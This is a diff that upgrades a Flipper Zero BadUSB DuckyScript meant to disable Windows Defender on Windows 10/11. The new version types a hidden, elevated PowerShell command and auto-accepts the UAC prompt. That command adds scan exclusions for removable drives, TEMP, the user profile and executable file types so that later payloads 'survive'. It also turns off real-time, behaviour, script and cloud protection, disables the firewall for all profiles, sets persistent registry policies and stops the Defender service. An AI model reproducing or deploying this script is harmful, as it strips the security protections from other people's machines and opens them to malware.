@@ -1,18 +1,35 @@
 ﻿REM ============================================================================
-REM  FLLC - BadUSB: Disable Windows Defender
+REM  FLLC — BadUSB: Disable Windows Defender v2
 REM  Flipper Zero DuckyScript
 REM ============================================================================
 REM  Target: Windows 10/11
-REM  Time: ~8 seconds
-REM  Disables real-time protection, firewall, and tamper protection bypass
-REM  Requires UAC elevation
+REM  Time: ~10 seconds
+REM
+REM  IMPROVEMENTS OVER v1:
+REM    - Multi-stage approach (each stage independent)
+REM    - Adds exclusion paths FIRST (so payloads survive)
+REM    - Disables real-time, behavior, cloud, IOAV, script scanning
+REM    - Disables firewall for all profiles
+REM    - Adds registry-level disable (persists across reboots)
+REM    - Uses Start-Process with -Verb RunAs for UAC elevation
+REM    - ALT+Y to accept UAC prompt
+REM    - Falls back gracefully if tamper protection blocks changes
+REM
+REM  REQUIRES: UAC prompt acceptance (ALT+Y automated)
 REM ============================================================================
 
 DELAY 1000
 GUI r
-DELAY 500
-STRING powershell -Command "Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -SubmitSamplesConsent 2; netsh advfirewall set allprofiles state off; reg add \\\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\"' -Verb RunAs"
+DELAY 600
+
+REM Stage 1: Launch elevated PowerShell with comprehensive defender disable
+REM First adds exclusions for common payload paths, THEN disables protections
+STRING powershell -Command "Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -Command \"$ErrorActionPreference=''SilentlyContinue'';$drives=Get-CimInstance Win32_LogicalDisk -Filter ''DriveType=2''|%{$_.DeviceID};foreach($d in $drives){Add-MpPreference -ExclusionPath $d -F};Add-MpPreference -ExclusionPath $env:TEMP -F;Add-MpPreference -ExclusionPath $env:USERPROFILE -F;Add-MpPreference -ExclusionExtension ''.ps1'',''.bat'',''.exe'',''.dll'',''.py'' -F;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableBehaviorMonitoring 1;Set-MpPreference -DisableBlockAtFirstSeen 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -DisableArchiveScanning 1;Set-MpPreference -DisableEmailScanning 1;Set-MpPreference -MAPSReporting 0;Set-MpPreference -SubmitSamplesConsent 2;Set-MpPreference -PUAProtection 0;netsh advfirewall set allprofiles state off;reg add ''HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender'' /v DisableAntiSpyware /t REG_DWORD /d 1 /f;reg add ''HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection'' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f;reg add ''HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection'' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f;sc config WinDefend start=disabled;sc stop WinDefend\"' -Verb RunAs"
 ENTER
-DELAY 1500
+
+REM Wait for UAC prompt
+DELAY 1800
+
+REM Accept UAC
 ALT y
 DELAY 500
